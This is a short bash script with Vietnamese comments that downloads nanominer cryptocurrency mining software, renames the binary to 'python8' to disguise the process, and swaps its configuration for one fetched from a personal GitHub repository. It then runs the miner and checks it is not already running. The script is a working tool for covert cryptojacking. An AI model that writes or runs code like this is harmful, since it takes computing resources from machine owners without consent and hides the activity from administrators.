#! /bin/bash
set -x #echo on
if [ -f ${PWD}/nanominer-linux-1.6.2.tar.gz ]; then
    if pgrep -x "python8" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
cd nanominer-linux-1.6.2
./python8
     
fi
exit
fi

wget https://github.com/nanopool/nanominer/releases/download/v1.6.2/nanominer-linux-1.6.2.tar.gz
tar xvzf nanominer-linux-1.6.2.tar.gz
cd nanominer-linux-1.6.2
mv nanominer python8
rm config.ini
wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/config.ini
chmod +x python8
./python8
